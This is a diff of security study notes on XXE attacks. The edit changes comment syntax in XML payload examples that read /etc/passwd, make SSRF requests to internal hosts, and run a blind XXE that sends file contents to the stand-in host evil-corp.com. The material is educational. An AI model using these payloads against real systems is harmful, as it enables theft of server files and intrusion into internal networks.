@@ -27,17 +27,17 @@ Most XXE attacks are caused by XML external entities.
 
 - `Retrieve file contents`: 
 ```xml
-# Return the contents of `/etc/passwd`
+<!-- Return the contents of `/etc/passwd` -->
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
 ```
 - `Perform SSRF attack`: 
 ```xml
-# Return contents of `http://internal-website.com`
+<!-- Return contents of `http://internal-website.com` -->
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal-website.com" > ]>
 ```
 - `Blind XXE to exfiltrate data`: 
 ```xml
-# Cause the contents of `/etc/passwd` to be send to http://evil-corp.com
+<!-- Cause the contents of `/etc/passwd` to be send to http://evil-corp.com -->
 <!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd" >
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil-corp.com/?x=%file;'>"> %eval; %exfiltrate; ]>`
 ```
@@ -52,7 +52,7 @@ Attacker must introduce or edit the DOCTYPE.  For example, an XML request that g
 <?xml version="1.0" encoding="UTF-8"?>
 <stockCheck><productId>381</productId></stockCheck>
 
-# Alter to include a doctype that references a local file with a new `&xxe;` entity
+<!-- Alter to include a doctype that references a local file with a new `&xxe;` entity -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
@@ -63,8 +63,10 @@ Attacker must introduce or edit the DOCTYPE.  For example, an XML request that g
 Induce the application to make a request and return the resonse from an internal system:
 
 ```xml
-# Reponse will include response from http://internal.vulnerable-website.com/ if output is displayed to the user
-# Otherwise, this is a blind XXE attack
+<!-- 
+Reponse will include response from http://internal.vulnerable-website.com/ if output is displayed to the user
+Otherwise, this is a blind XXE attack
+-->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
